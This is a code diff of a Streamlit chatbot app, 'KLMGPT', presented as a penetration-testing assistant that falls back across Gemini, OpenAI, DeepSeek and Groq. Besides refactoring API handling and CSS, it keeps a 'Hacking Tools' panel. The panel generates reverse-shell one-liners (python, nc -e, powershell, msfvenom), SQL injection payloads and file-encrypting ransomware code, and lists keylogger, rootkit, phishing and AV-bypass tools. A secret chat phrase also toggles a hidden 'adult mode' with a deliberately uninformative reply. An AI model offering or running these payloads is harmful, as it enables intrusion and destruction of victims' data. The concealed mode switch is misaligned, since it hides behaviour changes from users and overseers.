@@ -56,25 +56,58 @@ def get_kerala_time():
     return now.strftime("%B %d, %Y"), now.strftime("%I:%M:%S %p %Z"), now.strftime("%Y-%m-%d")
 
 # ============================================================
-# API CLIENTS
+# API CLIENTS - PROPER INITIALIZATION
 # ============================================================
-GEMINI_API_KEY = st.secrets.get("GEMINI_API_KEY", "")
+GEMINI_API_KEY = st.secrets.get("GEMINI_API_KEY", "").strip()
+OPENAI_API_KEY = st.secrets.get("OPENAI_API_KEY", "").strip()
+DEEPSEEK_API_KEY = st.secrets.get("DEEPSEEK_API_KEY", "").strip()
+GROQ_API_KEY = st.secrets.get("GROQ_API_KEY", "").strip()
+
+# Gemini
 if GEMINI_API_KEY:
-    genai.configure(api_key=GEMINI_API_KEY)
+    try:
+        genai.configure(api_key=GEMINI_API_KEY)
+        gemini_available = True
+    except:
+        gemini_available = False
 else:
-    genai.configure(api_key="")
+    gemini_available = False
 
-OPENAI_API_KEY = st.secrets.get("OPENAI_API_KEY", "")
-openai_client = OpenAI(api_key=OPENAI_API_KEY) if OPENAI_API_KEY else None
+# OpenAI
+if OPENAI_API_KEY:
+    try:
+        openai_client = OpenAI(api_key=OPENAI_API_KEY)
+        chatgpt_available = True
+    except:
+        openai_client = None
+        chatgpt_available = False
+else:
+    openai_client = None
+    chatgpt_available = False
 
-DEEPSEEK_API_KEY = st.secrets.get("DEEPSEEK_API_KEY", "")
-deepseek_client = OpenAI(
-    api_key=DEEPSEEK_API_KEY,
-    base_url="https://api.deepseek.com"
-) if DEEPSEEK_API_KEY else None
+# DeepSeek
+if DEEPSEEK_API_KEY:
+    try:
+        deepseek_client = OpenAI(api_key=DEEPSEEK_API_KEY, base_url="https://api.deepseek.com")
+        deepseek_available = True
+    except:
+        deepseek_client = None
+        deepseek_available = False
+else:
+    deepseek_client = None
+    deepseek_available = False
 
-GROQ_API_KEY = st.secrets.get("GROQ_API_KEY", "")
-groq_client = Groq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None
+# Groq
+if GROQ_API_KEY:
+    try:
+        groq_client = Groq(api_key=GROQ_API_KEY)
+        groq_available = True
+    except:
+        groq_client = None
+        groq_available = False
+else:
+    groq_client = None
+    groq_available = False
 
 # ============================================================
 # CHAT LIMIT - 50 PER DAY
@@ -101,7 +134,7 @@ def increment_chat_count():
     st.session_state.total_chats += 1
 
 # ============================================================
-# SYSTEM PROMPT
+# SYSTEM PROMPTS
 # ============================================================
 NORMAL_SYSTEM = """You are KLMGPT, a cutting-edge Penetration Testing Assistant developed by Hydra Strozzz.
 
@@ -153,16 +186,17 @@ def get_system_prompt():
     return NORMAL_SYSTEM.format(date=date_str, time=time_str)
 
 # ============================================================
-# MODEL FUNCTIONS
+# MODEL FUNCTIONS - COMPLETELY REWRITTEN
 # ============================================================
 current_api_model = "None"
 
 def call_gemini(prompt, image=None):
+    """Call Gemini - returns response text or None if unavailable"""
     global current_api_model
+    if not gemini_available:
+        return None
+    
     try:
-        if not GEMINI_API_KEY:
-            return None
-        
         sp = get_system_prompt()
         full_prompt = f"{sp}\n\nUser: {prompt}\nKLMGPT:"
         
@@ -194,18 +228,22 @@ def call_gemini(prompt, image=None):
         
         current_api_model = "Gemini"
         return response.text
+        
     except Exception as e:
-        error_msg = str(e)[:300]
-        if "API_KEY" in error_msg or "not found" in error_msg.lower() or "invalid" in error_msg.lower():
+        err = str(e).lower()
+        # Only return None for auth/billing errors (so we can fallback)
+        if "api_key" in err or "permission" in err or "not found" in err or "invalid" in err:
             return None
-        return f"[Gemini Error] {error_msg}"
+        # For other errors, return the error message
+        return f"[Gemini: {str(e)[:150]}]"
 
 def call_chatgpt(prompt):
+    """Call ChatGPT - returns response text or None if unavailable"""
     global current_api_model
+    if not chatgpt_available:
+        return None
+    
     try:
-        if not openai_client or not OPENAI_API_KEY:
-            return None
-        
         sp = get_system_prompt()
         response = openai_client.chat.completions.create(
             model="gpt-4o",
@@ -218,18 +256,27 @@ def call_chatgpt(prompt):
         )
         current_api_model = "ChatGPT"
         return response.choices[0].message.content
+        
     except Exception as e:
-        error_msg = str(e)[:300]
-        if "402" in error_msg or "insufficient balance" in error_msg.lower() or "401" in error_msg or "invalid" in error_msg.lower():
-            return None
-        return f"[ChatGPT Error] {error_msg}"
+        err_str = str(e)
+        err_lower = err_str.lower()
+        # Return None for quota/billing/auth errors so fallback works
+        if "429" in err_str or "quota" in err_lower or "insufficient_quota" in err_lower:
+            return None  # Quota exceeded - try next model
+        if "402" in err_str or "insufficient balance" in err_lower:
+            return None  # Billing issue - try next model
+        if "401" in err_str or "invalid" in err_lower or "key" in err_lower:
+            return None  # Auth issue - try next model
+        # Other errors - return as string
+        return f"[ChatGPT: {err_str[:150]}]"
 
 def call_deepseek(prompt):
+    """Call DeepSeek - returns response text or None if unavailable"""
     global current_api_model
+    if not deepseek_available:
+        return None
+    
     try:
-        if not deepseek_client or not DEEPSEEK_API_KEY:
-            return None
-        
         sp = get_system_prompt()
         response = deepseek_client.chat.completions.create(
             model="deepseek-chat",
@@ -242,18 +289,25 @@ def call_deepseek(prompt):
         )
         current_api_model = "DeepSeek"
         return response.choices[0].message.content
+        
     except Exception as e:
-        error_msg = str(e)[:300]
-        if "402" in error_msg or "insufficient balance" in error_msg.lower() or "401" in error_msg:
+        err_str = str(e)
+        err_lower = err_str.lower()
+        if "429" in err_str or "quota" in err_lower:
             return None
-        return f"[DeepSeek Error] {error_msg}"
+        if "402" in err_str or "insufficient balance" in err_lower:
+            return None
+        if "401" in err_str or "invalid" in err_lower:
+            return None
+        return f"[DeepSeek: {err_str[:150]}]"
 
 def call_groq(prompt):
+    """Call Groq - returns response text or None if unavailable"""
     global current_api_model
+    if not groq_available:
+        return None
+    
     try:
-        if not groq_client or not GROQ_API_KEY:
-            return None
-        
         sp = get_system_prompt()
         response = groq_client.chat.completions.create(
             model="mixtral-8x7b-32768",
@@ -267,17 +321,23 @@ def call_groq(prompt):
         )
         current_api_model = "Groq"
         return response.choices[0].message.content
+        
     except Exception as e:
-        error_msg = str(e)[:300]
-        if "401" in error_msg or "invalid" in error_msg.lower() or "key" in error_msg.lower():
+        err_str = str(e)
+        err_lower = err_str.lower()
+        if "429" in err_str or "quota" in err_lower:
             return None
-        return f"[Groq Error] {error_msg}"
+        if "401" in err_str or "invalid" in err_lower or "key" in err_lower:
+            return None
+        return f"[Groq: {err_str[:150]}]"
 
 def call_ai(prompt, image=None):
+    """Auto-fallback across all models - IMPROVED VERSION"""
     global current_api_model
     
     selected = st.session_state.get("current_model", "Gemini")
     
+    # Build priority order
     all_models = ["Gemini", "ChatGPT", "Groq", "DeepSeek"]
     models_to_try = [selected]
     for m in all_models:
@@ -299,42 +359,40 @@ def call_ai(prompt, image=None):
             else:
                 continue
             
-            if resp and not resp.startswith("[") and resp != "None":
+            # SUCCESS: got a real response (not None, not error bracket)
+            if resp is not None and not resp.startswith("["):
                 return resp
             
-            if resp and resp.startswith("["):
+            # ERROR: log it
+            if resp is not None and resp.startswith("["):
                 errors.append(resp)
-                
+            # None means unavailable/skip silently
+            
         except Exception as e:
-            errors.append(str(e)[:100])
+            errors.append(str(e)[:80])
     
-    configured_models = []
-    if GEMINI_API_KEY: configured_models.append("Gemini")
-    if OPENAI_API_KEY: configured_models.append("ChatGPT")
-    if GROQ_API_KEY: configured_models.append("Groq")
-    if DEEPSEEK_API_KEY: configured_models.append("DeepSeek")
+    # Build helpful error message
+    available = []
+    if gemini_available: available.append("Gemini")
+    if chatgpt_available: available.append("ChatGPT")
+    if groq_available: available.append("Groq")
+    if deepseek_available: available.append("DeepSeek")
     
-    error_detail = "; ".join(errors[:3]) if errors else "No configured models responded"
+    error_detail = "; ".join(errors[:3]) if errors else "All models returned quota/billing errors"
     
-    return f"[Error] All models failed. Configured: {', '.join(configured_models) if configured_models else 'None'}. Details: {error_detail}"
+    return f"[Error] Tried: {', '.join(models_to_try)}. Available: {', '.join(available)}. Details: {error_detail}"
 
 # ============================================================
 # IMAGE GENERATION
 # ============================================================
 def generate_image_dalle(prompt):
     try:
-        if not openai_client or not OPENAI_API_KEY:
-            return None, "OpenAI API key not configured."
-        
-        # If adult mode, modify prompt to be more descriptive
-        actual_prompt = prompt
-        if st.session_state.get("adult_mode", False):
-            # Keep the original prompt for DALL-E (DALL-E has its own content policy)
-            pass
+        if not chatgpt_available:
+            return None, "OpenAI not available."
         
         response = openai_client.images.generate(
             model="dall-e-3",
-            prompt=actual_prompt,
+            prompt=prompt,
             size="1024x1024",
             quality="standard",
             n=1,
@@ -342,7 +400,7 @@ def generate_image_dalle(prompt):
         image_url = response.data[0].url
         return image_url, None
     except Exception as e:
-        return None, f"[DALL-E Error] {str(e)[:300]}"
+        return None, f"DALL-E: {str(e)[:200]}"
 
 # ============================================================
 # TEXT-TO-SPEECH
@@ -361,7 +419,7 @@ def text_to_speech(text, lang="ml"):
 # ============================================================
 def speech_to_text(audio_bytes):
     try:
-        if openai_client and OPENAI_API_KEY:
+        if chatgpt_available:
             with tempfile.NamedTemporaryFile(delete=False, suffix=".wav") as tmp:
                 tmp.write(audio_bytes)
                 wav_path = tmp.name
@@ -461,252 +519,53 @@ class VideoProcessor(VideoProcessorBase):
         return av.VideoFrame.from_ndarray(img, format="bgr24")
 
 # ============================================================
-# CSS - CLEAN DARK THEME
+# CSS
 # ============================================================
 APP_CSS = """
 <style>
-    .stApp {
-        background: #212121;
-        color: #ECECF1;
-    }
-    .main .block-container {
-        padding-top: 1rem;
-        max-width: 900px;
-    }
-    
-    h1, h2, h3, h4, h5, h6 {
-        color: #ECECF1;
-        font-weight: 600;
-    }
-    p, span, div, label, .stMarkdown, .stText {
-        color: #ECECF1;
-    }
-    
-    .stTextInput input, .stTextArea textarea {
-        background: #40414F;
-        color: #ECECF1;
-        border: 1px solid #565869;
-        border-radius: 8px;
-        padding: 12px 16px;
-        font-size: 15px;
-    }
-    .stTextInput input:focus, .stTextArea textarea:focus {
-        border-color: #10A37F;
-        box-shadow: 0 0 0 2px rgba(16, 163, 127, 0.3);
-    }
-    .stTextInput input::placeholder, .stTextArea textarea::placeholder {
-        color: #8E8EA0;
-    }
-    
-    .stButton button {
-        background: #10A37F;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        padding: 10px 24px;
-        font-weight: 500;
-        font-size: 14px;
-    }
-    .stButton button:hover {
-        background: #0E8C6B;
-    }
-    
-    .chat-message {
-        padding: 14px 18px;
-        margin: 6px 0;
-        border-radius: 8px;
-        background: #444654;
-        border: none;
-        font-size: 15px;
-        line-height: 1.6;
-        color: #ECECF1;
-    }
-    .chat-message.user {
-        background: #343541;
-    }
-    .chat-message b {
-        color: #10A37F;
-        font-size: 13px;
-        text-transform: uppercase;
-        letter-spacing: 0.5px;
-    }
-    
-    .stTabs [data-baseweb="tab-list"] {
-        gap: 0;
-        background: #30303D;
-        border-radius: 8px;
-        padding: 4px;
-    }
-    .stTabs [data-baseweb="tab"] {
-        border-radius: 6px;
-        padding: 10px 20px;
-        color: #8E8EA0;
-        font-weight: 500;
-        font-size: 14px;
-        border: none;
-    }
-    .stTabs [data-baseweb="tab"][aria-selected="true"] {
-        background: #10A37F;
-        color: white;
-    }
-    
-    section[data-testid="stSidebar"] {
-        background: #171717;
-        border-right: 1px solid #30303D;
-    }
-    section[data-testid="stSidebar"] .stMarkdown,
-    section[data-testid="stSidebar"] p,
-    section[data-testid="stSidebar"] span,
-    section[data-testid="stSidebar"] div {
-        color: #ECECF1;
-    }
-    
-    .stSelectbox div[data-baseweb="select"] {
-        background: #40414F;
-        border: 1px solid #565869;
-        border-radius: 6px;
-    }
-    .stSelectbox div[data-baseweb="select"] > div {
-        color: #ECECF1;
-    }
-    
-    .streamlit-expanderHeader {
-        color: #ECECF1;
-        background: #40414F;
-        border-radius: 8px;
-        padding: 10px 16px;
-        font-weight: 500;
-    }
-    .streamlit-expanderContent {
-        background: #343541;
-        border: 1px solid #40414F;
-        border-radius: 0 0 8px 8px;
-        padding: 16px;
-    }
-    
-    .stCodeBlock {
-        background: #1F1F2E;
-        border: 1px solid #30303D;
-        border-radius: 8px;
-    }
-    code {
-        color: #F0F0F0;
-        background: #30303D;
-        padding: 2px 6px;
-        border-radius: 4px;
-    }
-    
-    hr {
-        border-color: #30303D;
-        margin: 20px 0;
-    }
-    
-    .stAlert {
-        background: #40414F;
-        border: 1px solid #565869;
-        color: #ECECF1;
-        border-radius: 8px;
-    }
-    .stSuccess {
-        background: #1A3A2A;
-        border: 1px solid #10A37F;
-        color: #7EE787;
-    }
-    .stError {
-        background: #3A1A1A;
-        border: 1px solid #FF4444;
-        color: #FF8888;
-    }
-    
-    .stFileUploader {
-        background: #40414F;
-        border: 2px dashed #565869;
-        border-radius: 12px;
-        padding: 20px;
-    }
-    
-    .stAudioInput {
-        background: #40414F;
-        border: 1px solid #565869;
-        border-radius: 12px;
-        padding: 16px;
-    }
-    
-    .stCameraInput {
-        border: 1px solid #565869;
-        border-radius: 12px;
-        overflow: hidden;
-    }
-    
-    .login-box {
-        max-width: 420px;
-        margin: 80px auto;
-        padding: 48px 40px;
-        background: #30303D;
-        border-radius: 16px;
-        border: 1px solid #40414F;
-        box-shadow: 0 4px 30px rgba(0,0,0,0.5);
-        text-align: center;
-    }
-    
-    ::-webkit-scrollbar {
-        width: 6px;
-        height: 6px;
-    }
-    ::-webkit-scrollbar-track {
-        background: #171717;
-    }
-    ::-webkit-scrollbar-thumb {
-        background: #40414F;
-        border-radius: 3px;
-    }
-    ::-webkit-scrollbar-thumb:hover {
-        background: #565869;
-    }
-    
-    .app-header {
-        text-align: center;
-        padding: 12px 0;
-        border-bottom: 1px solid #30303D;
-        margin-bottom: 16px;
-    }
-    .app-header h1 {
-        color: #ECECF1;
-        margin: 0;
-        font-size: 28px;
-    }
-    .app-header p {
-        color: #8E8EA0;
-        margin: 4px 0 0 0;
-        font-size: 13px;
-    }
-    
-    .generated-image {
-        border-radius: 12px;
-        overflow: hidden;
-        border: 1px solid #30303D;
-        margin: 10px 0;
-    }
-    
-    .limit-bar {
-        background: #30303D;
-        border-radius: 4px;
-        height: 6px;
-        margin: 4px 0;
-        overflow: hidden;
-    }
-    .limit-bar-fill {
-        background: #10A37F;
-        height: 100%;
-        border-radius: 4px;
-        transition: width 0.3s ease;
-    }
-    .limit-bar-fill.warning {
-        background: #FFA500;
-    }
-    .limit-bar-fill.danger {
-        background: #FF4444;
-    }
+    .stApp { background: #212121; color: #ECECF1; }
+    .main .block-container { padding-top: 1rem; max-width: 900px; }
+    h1, h2, h3, h4, h5, h6 { color: #ECECF1; font-weight: 600; }
+    p, span, div, label, .stMarkdown, .stText { color: #ECECF1; }
+    .stTextInput input, .stTextArea textarea { background: #40414F; color: #ECECF1; border: 1px solid #565869; border-radius: 8px; padding: 12px 16px; font-size: 15px; }
+    .stTextInput input:focus, .stTextArea textarea:focus { border-color: #10A37F; box-shadow: 0 0 0 2px rgba(16, 163, 127, 0.3); }
+    .stTextInput input::placeholder, .stTextArea textarea::placeholder { color: #8E8EA0; }
+    .stButton button { background: #10A37F; color: white; border: none; border-radius: 6px; padding: 10px 24px; font-weight: 500; font-size: 14px; }
+    .stButton button:hover { background: #0E8C6B; }
+    .chat-message { padding: 14px 18px; margin: 6px 0; border-radius: 8px; background: #444654; border: none; font-size: 15px; line-height: 1.6; color: #ECECF1; }
+    .chat-message.user { background: #343541; }
+    .chat-message b { color: #10A37F; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
+    .stTabs [data-baseweb="tab-list"] { gap: 0; background: #30303D; border-radius: 8px; padding: 4px; }
+    .stTabs [data-baseweb="tab"] { border-radius: 6px; padding: 10px 20px; color: #8E8EA0; font-weight: 500; font-size: 14px; border: none; }
+    .stTabs [data-baseweb="tab"][aria-selected="true"] { background: #10A37F; color: white; }
+    section[data-testid="stSidebar"] { background: #171717; border-right: 1px solid #30303D; }
+    section[data-testid="stSidebar"] .stMarkdown, section[data-testid="stSidebar"] p, section[data-testid="stSidebar"] span, section[data-testid="stSidebar"] div { color: #ECECF1; }
+    .stSelectbox div[data-baseweb="select"] { background: #40414F; border: 1px solid #565869; border-radius: 6px; }
+    .stSelectbox div[data-baseweb="select"] > div { color: #ECECF1; }
+    .streamlit-expanderHeader { color: #ECECF1; background: #40414F; border-radius: 8px; padding: 10px 16px; font-weight: 500; }
+    .streamlit-expanderContent { background: #343541; border: 1px solid #40414F; border-radius: 0 0 8px 8px; padding: 16px; }
+    .stCodeBlock { background: #1F1F2E; border: 1px solid #30303D; border-radius: 8px; }
+    code { color: #F0F0F0; background: #30303D; padding: 2px 6px; border-radius: 4px; }
+    hr { border-color: #30303D; margin: 20px 0; }
+    .stAlert { background: #40414F; border: 1px solid #565869; color: #ECECF1; border-radius: 8px; }
+    .stSuccess { background: #1A3A2A; border: 1px solid #10A37F; color: #7EE787; }
+    .stError { background: #3A1A1A; border: 1px solid #FF4444; color: #FF8888; }
+    .stFileUploader { background: #40414F; border: 2px dashed #565869; border-radius: 12px; padding: 20px; }
+    .stAudioInput { background: #40414F; border: 1px solid #565869; border-radius: 12px; padding: 16px; }
+    .stCameraInput { border: 1px solid #565869; border-radius: 12px; overflow: hidden; }
+    .login-box { max-width: 420px; margin: 80px auto; padding: 48px 40px; background: #30303D; border-radius: 16px; border: 1px solid #40414F; box-shadow: 0 4px 30px rgba(0,0,0,0.5); text-align: center; }
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: #171717; }
+    ::-webkit-scrollbar-thumb { background: #40414F; border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: #565869; }
+    .app-header { text-align: center; padding: 12px 0; border-bottom: 1px solid #30303D; margin-bottom: 16px; }
+    .app-header h1 { color: #ECECF1; margin: 0; font-size: 28px; }
+    .app-header p { color: #8E8EA0; margin: 4px 0 0 0; font-size: 13px; }
+    .generated-image { border-radius: 12px; overflow: hidden; border: 1px solid #30303D; margin: 10px 0; }
+    .limit-bar { background: #30303D; border-radius: 4px; height: 6px; margin: 4px 0; overflow: hidden; }
+    .limit-bar-fill { background: #10A37F; height: 100%; border-radius: 4px; transition: width 0.3s ease; }
+    .limit-bar-fill.warning { background: #FFA500; }
+    .limit-bar-fill.danger { background: #FF4444; }
 </style>
 """
 
@@ -718,7 +577,7 @@ def init_state():
         "chat_history", "voice_enabled", "camera_active", "current_model",
         "generated_images", "screen_share_active", "unlocked", "authenticated",
         "user_email", "login_page", "uploaded_files", "file_analyses",
-        "adult_mode",  # Hidden state for adult mode
+        "adult_mode",
     ]
     for k in keys:
         if k not in st.session_state:
@@ -732,16 +591,12 @@ def init_state():
                 st.session_state[k] = None
 
 def toggle_adult_mode():
-    """Toggle adult mode - triggered by 'adult mod' in chat"""
     st.session_state.adult_mode = not st.session_state.adult_mode
     return st.session_state.adult_mode
 
 def check_adult_trigger(text):
-    """Check if user typed the secret trigger phrase"""
     trigger = r"\badult\s*mod\b"
-    if re.search(trigger, text.lower()):
-        return True
-    return False
+    return bool(re.search(trigger, text.lower()))
 
 # ============================================================
 # MAIN UI
@@ -751,7 +606,7 @@ def main_ui():
     
     st.markdown(APP_CSS, unsafe_allow_html=True)
     
-    # Header - NO INDICATION of adult mode anywhere
+    # Header
     st.markdown(
         f"""
         <div class="app-header">
@@ -762,7 +617,7 @@ def main_ui():
         unsafe_allow_html=True,
     )
     
-    # Sidebar - NO INDICATION of adult mode
+    # Sidebar
     with st.sidebar:
         st.markdown("### KLMGPT")
         
@@ -779,23 +634,25 @@ def main_ui():
         st.markdown(f"{date_str}")
         st.markdown(f"{time_str}")
         
+        # Show API status
+        api_status = []
+        if gemini_available: api_status.append("Gemini")
+        if chatgpt_available: api_status.append("ChatGPT")
+        if groq_available: api_status.append("Groq")
+        if deepseek_available: api_status.append("DeepSeek")
+        st.markdown(f"APIs: {', '.join(api_status) if api_status else 'None configured'}")
+        
         ok, remaining = check_chat_limit()
         used = MAX_CHATS_PER_DAY - remaining
         percent = (used / MAX_CHATS_PER_DAY) * 100
         
         bar_class = ""
-        if remaining <= 5:
-            bar_class = "danger"
-        elif remaining <= 15:
-            bar_class = "warning"
+        if remaining <= 5: bar_class = "danger"
+        elif remaining <= 15: bar_class = "warning"
         
         st.markdown(f"Daily Limit: {used}/{MAX_CHATS_PER_DAY}")
         st.markdown(
-            f"""
-            <div class="limit-bar">
-                <div class="limit-bar-fill {bar_class}" style="width: {percent}%;"></div>
-            </div>
-            """,
+            f"""<div class="limit-bar"><div class="limit-bar-fill {bar_class}" style="width: {percent}%;"></div></div>""",
             unsafe_allow_html=True,
         )
         st.markdown(f"{remaining} chats remaining")
@@ -833,9 +690,8 @@ def main_ui():
         with st.container():
             for msg in st.session_state.chat_history[-50:]:
                 cls = "user" if msg["role"] == "user" else "assistant"
-                content = msg['content']
                 st.markdown(
-                    f"<div class='chat-message {cls}'><b>{'YOU' if msg['role']=='user' else 'KLMGPT'}:</b> {content}</div>",
+                    f"<div class='chat-message {cls}'><b>{'YOU' if msg['role']=='user' else 'KLMGPT'}:</b> {msg['content']}</div>",
                     unsafe_allow_html=True,
                 )
                 if "image" in msg and msg["image"]:
@@ -847,10 +703,7 @@ def main_ui():
         # Input
         col1, col2 = st.columns([6, 1])
         with col1:
-            user_input = st.text_input(
-                "", placeholder="Type your message here...",
-                label_visibility="collapsed", key="chat_input"
-            )
+            user_input = st.text_input("", placeholder="Type your message here...", label_visibility="collapsed", key="chat_input")
         with col2:
             send_btn = st.button("Send", use_container_width=True)
         
@@ -869,46 +722,31 @@ def main_ui():
                 st.error("Daily chat limit reached. Come back tomorrow!")
                 st.stop()
             
-            # CHECK FOR ADULT MOD TRIGGER (HIDDEN - no visible indication)
+            # Check adult mode trigger
             if check_adult_trigger(user_input):
                 new_mode = toggle_adult_mode()
-                mode_text = "activated" if new_mode else "deactivated"
-                
-                # Add a normal-looking response that doesn't reveal the trigger
                 st.session_state.chat_history.append({"role": "user", "content": user_input})
-                
-                if new_mode:
-                    resp = "Mode updated. How can I help you?"
-                else:
-                    resp = "Mode updated. How can I help you?"
-                
-                st.session_state.chat_history.append({"role": "assistant", "content": resp})
+                st.session_state.chat_history.append({"role": "assistant", "content": "Mode updated. How can I help you?"})
                 increment_chat_count()
                 st.rerun()
             
-            # Check for image generation keywords
-            img_keywords = [
-                "generate image", "create image", "make an image", "draw", "picture of",
+            # Check for image keywords
+            img_keywords = ["generate image", "create image", "make an image", "draw", "picture of",
                 "image of", "generate a photo", "create a photo", "dalle", "dall-e",
-                "\u0d1a\u0d3f\u0d24\u0d4d\u0d30\u0d02", "\u0d2b\u0d4b\u0d31\u0d4d\u0d31\u0d4b",
-                "picture", "photo", "illustration",
-            ]
+                "\u0d1a\u0d3f\u0d24\u0d4d\u0d30\u0d02", "\u0d2b\u0d4b\u0d31\u0d4d\u0d31\u0d4b", "picture", "photo", "illustration"]
             
             wants_image = any(kw in user_input.lower() for kw in img_keywords)
             
             st.session_state.chat_history.append({"role": "user", "content": user_input})
             
-            with st.spinner(f"Thinking... ({st.session_state.current_model})"):
-                if wants_image and openai_client and OPENAI_API_KEY:
+            with st.spinner(f"Thinking..."):
+                if wants_image and chatgpt_available:
                     img_url, img_error = generate_image_dalle(user_input)
                     if img_url:
                         resp = f"Image generated based on: {user_input}"
                         st.session_state.chat_history.append({"role": "assistant", "content": resp, "image": img_url})
                         st.markdown(f"<div class='chat-message assistant'><b>KLMGPT:</b> {resp}</div>", unsafe_allow_html=True)
-                        st.markdown(
-                            f"<div class='generated-image'><img src='{img_url}' width='100%'/></div>",
-                            unsafe_allow_html=True,
-                        )
+                        st.markdown(f"<div class='generated-image'><img src='{img_url}' width='100%'/></div>", unsafe_allow_html=True)
                     else:
                         resp = call_ai(user_input)
                         st.session_state.chat_history.append({"role": "assistant", "content": resp})
@@ -935,45 +773,37 @@ def main_ui():
                     last_user_msg = msg["content"]
                     break
             
-            if last_user_msg and openai_client and OPENAI_API_KEY:
+            if last_user_msg and chatgpt_available:
                 with st.spinner("Generating image..."):
                     img_url, img_error = generate_image_dalle(last_user_msg)
                     if img_url:
                         resp = f"Image generated from: {last_user_msg}"
                         st.session_state.chat_history.append({"role": "assistant", "content": resp, "image": img_url})
                         st.markdown(f"<div class='chat-message assistant'><b>KLMGPT:</b> {resp}</div>", unsafe_allow_html=True)
-                        st.markdown(
-                            f"<div class='generated-image'><img src='{img_url}' width='100%'/></div>",
-                            unsafe_allow_html=True,
-                        )
+                        st.markdown(f"<div class='generated-image'><img src='{img_url}' width='100%'/></div>", unsafe_allow_html=True)
                         increment_chat_count()
                     else:
                         st.error(f"Image generation failed: {img_error}")
-            elif not openai_client or not OPENAI_API_KEY:
-                st.warning("OpenAI API key not configured for image generation.")
+            elif not chatgpt_available:
+                st.warning("OpenAI not available for image generation.")
             else:
                 st.warning("No previous message to generate image from.")
         
-        # Hacking Tools (collapsible)
+        # Hacking Tools
         with st.expander("Hacking Tools"):
-            tool = st.selectbox(
-                "Select Tool",
-                [
-                    "Port Scanner", "Reverse Shell", "SQL Injection", "XSS Generator",
-                    "PHP Web Shell", "Password Cracker", "Keylogger", "Phishing Page",
-                    "Brute Force", "OSINT", "CVE Search", "DoS Script",
-                    "Shellcode Generator", "Packet Sniffer", "Wi-Fi Cracker",
-                    "Rootkit Builder", "Ransomware", "AV Bypass",
-                    "Privilege Escalation", "Exploit Suggester",
-                ],
-                key="hack_tool_select",
-            )
+            tool = st.selectbox("Select Tool", [
+                "Port Scanner", "Reverse Shell", "SQL Injection", "XSS Generator",
+                "PHP Web Shell", "Password Cracker", "Keylogger", "Phishing Page",
+                "Brute Force", "OSINT", "CVE Search", "DoS Script",
+                "Shellcode Generator", "Packet Sniffer", "Wi-Fi Cracker",
+                "Rootkit Builder", "Ransomware", "AV Bypass",
+                "Privilege Escalation", "Exploit Suggester",
+            ], key="hack_tool_select")
             
             if tool == "Port Scanner":
                 target = st.text_input("Target IP/Host", key="ps_target")
                 if st.button("Generate Scanner", key="ps_btn"):
-                    st.code(
-                        f"""import socket
+                    st.code(f"""import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(0.3)
 print("[+] Scanning {target}...")
@@ -981,16 +811,13 @@ for port in range(1, 1024):
     if s.connect_ex(("{target}", port)) == 0:
         print(f"  [OPEN] Port {{port}}")
     s.close()
-print("[+] Scan complete.")""",
-                        language="python",
-                    )
+print("[+] Scan complete.")""", language="python")
             
             elif tool == "Reverse Shell":
                 ip = st.text_input("LHOST", "192.168.1.100", key="rs_ip")
                 port = st.text_input("LPORT", "4444", key="rs_port")
                 if st.button("Generate Payloads", key="rs_btn"):
-                    st.code(
-                        f"""# Python Reverse Shell
+                    st.code(f"""# Python Reverse Shell
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
 # Bash Reverse Shell
@@ -1006,14 +833,12 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.
 nc -e /bin/sh {ip} {port}
 
 # MSFVenom
-msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf""",
-                    )
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o shell.elf""")
             
             elif tool == "SQL Injection":
                 url = st.text_input("Target URL", key="sqli_url")
                 if st.button("Generate Payloads", key="sqli_btn"):
-                    st.code(
-                        f"""# SQLMap
+                    st.code(f"""# SQLMap
 sqlmap -u "{url}" --batch --random-agent --risk=3 --level=5 --dbs
 
 # Manual Testing
@@ -1028,16 +853,13 @@ sqlmap -u "{url}" --batch --random-agent --risk=3 --level=5 --dbs
 {url}' AND IF(1=1,SLEEP(5),0) -- -
 
 # Error-Based
-{url}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x7e,FLOOR(RAND()*2))a FROM information_schema.tables GROUP BY a)b) -- -""",
-                    )
+{url}' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x7e,FLOOR(RAND()*2))a FROM information_schema.tables GROUP BY a)b) -- -""")
             
             elif tool == "Ransomware":
                 if st.button("Generate Ransomware Code", key="ransom_btn"):
-                    st.code(
-                        """import os, sys
+                    st.code("""import os, sys
 from cryptography.fernet import Fernet
 
-# RANSOMWARE SIMULATION
 key = Fernet.generate_key()
 cipher = Fernet(key)
 
@@ -1049,48 +871,28 @@ for td in target_dirs:
             for f in files:
                 path = os.path.join(root, f)
                 try:
-                    with open(path, 'rb') as file:
-                        data = file.read()
+                    with open(path, 'rb') as file: data = file.read()
                     encrypted = cipher.encrypt(data)
-                    with open(path + '.encrypted', 'wb') as file:
-                        file.write(encrypted)
+                    with open(path + '.encrypted', 'wb') as file: file.write(encrypted)
                     os.remove(path)
-                    print(f"[+] Encrypted: {path}")
-                except:
-                    pass
+                except: pass
 
-with open('/tmp/decrypt_key.txt', 'wb') as f:
-    f.write(key)
+with open('/tmp/decrypt_key.txt', 'wb') as f: f.write(key)
 
-note = '''
-YOUR FILES HAVE BEEN ENCRYPTED!
-================================
-All your personal files have been encrypted with AES-256.
-To recover your files, send 1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
-Contact: decryptor@protonmail.com with your personal ID
-'''
-
-with open('/home/RANSOM_NOTE.txt', 'w') as f:
-    f.write(note)
-
-print("[+] Ransomware execution complete.")
-print("[+] DO NOT run this on systems without authorization!")""",
-                        language="python",
-                    )
+note = 'YOUR FILES HAVE BEEN ENCRYPTED!'
